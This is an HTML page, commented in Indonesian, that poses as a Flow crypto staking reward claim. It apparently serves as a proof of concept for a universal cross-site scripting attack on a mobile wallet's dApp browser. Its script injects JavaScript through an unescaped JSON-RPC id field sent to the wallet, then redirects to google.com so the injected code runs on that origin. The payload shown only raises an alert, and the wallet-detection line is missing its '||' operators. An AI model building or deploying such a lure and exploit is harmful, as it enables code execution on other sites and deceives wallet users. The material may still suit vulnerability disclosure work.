<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flow Rewards Program</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: #0b0e11; 
            color: #ffffff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .container {
            text-align: center;
            padding: 40px;
            background: #1e2329;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 1px solid #00ef8b;
            max-width: 350px;
        }
        h1 { color: #00ef8b; font-size: 24px; }
        p { color: #848e9c; margin-bottom: 30px; }
        .exploit-btn {
            background-color: #00ef8b;
            color: #000000;
            padding: 15px 32px;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: transform 0.2s;
            text-decoration: none;
            display: inline-block;
        }
        .exploit-btn:active { transform: scale(0.95); }
    </style>
</head>
<body>

<div class="container">
    <img src="https://cryptologos.cc/logos/flow-flow-logo.png" width="80" alt="Flow Logo">
    <h1>Bonus Staking Terdeteksi!</h1>
    <p>Klik tombol di bawah untuk mengklaim 100 FLOW ke dompet Anda.</p>
    
    <button class="exploit-btn" onclick="claimRewards()">CLICK HERE TO CLAIM</button>
</div>

<script>
    function claimRewards() {
        // Target navigasi (situs korban dimana JavaScript akan dieksekusi)
        const targetVictim = "https://www.google.com";

        // Payload UXSS yang memanfaatkan kurangnya escaping pada idfield
        // Struktur: ",alert(origin),"
        const maliciousId = '",alert("UXSS EXPLOITED! \n\nScript dijalankan pada Origin: " + window.location.origin),"';

        // Menyiapkan pesan permintaan sesuai format dApp
        const payload = {
            type: 'request',
            target: 'FlowContentScript',
            request: {
                jsonrpc: '2.0',
                id: maliciousId, // Injeksi pada parameter ID
                method: 'connect',
                params: {}
            }
        };

        // Deteksi objek wallet (FCL atau shim native)
        const wallet = window.FueletWallet  window.FlowWallet  window.fcl;

        if (wallet) {
            // 1. Kirim pesan ke Native (Trigger sendResponseToJs)
            wallet.postMessage(JSON.stringify(payload));

            // 2. Navigasi cepat ke origin korban
            // Ini memastikan saat sendResponseToJs dipanggil, kita sudah berada di origin target
            setTimeout(() => {
                window.location.href = targetVictim;
            }, 100); 
        } else {
            alert("Gunakan Browser dApp di Dompet Anda untuk klaim!");
        }
    }
</script>

</body>
</html>
